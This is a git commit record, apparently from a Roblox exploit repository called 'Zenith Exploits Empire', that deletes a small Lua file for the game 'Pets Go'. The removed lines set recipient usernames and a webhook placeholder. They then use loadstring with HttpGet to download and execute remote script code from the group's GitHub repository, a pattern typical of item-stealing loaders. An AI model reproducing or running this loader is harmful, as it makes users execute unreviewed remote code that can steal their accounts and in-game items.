d4fa296e7ddab62475c42363529f57391a43b94f
Zenith Exploits Empire <arshansiddiqui.msvd@gmail.com>
2025-04-19 09:55:46 +0200

    Delete pets go/auraisop.lua

--- pets go/auraisop.lua
+++
@@ -1,5 +0,0 @@
-Username = "dggg"
-Username2 = "jhgfsdas"
-Webhook = "url.xdddd"
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenith-Exploits-Empire/Final/refs/heads/main/RAW%20-%20pets%20go"))()
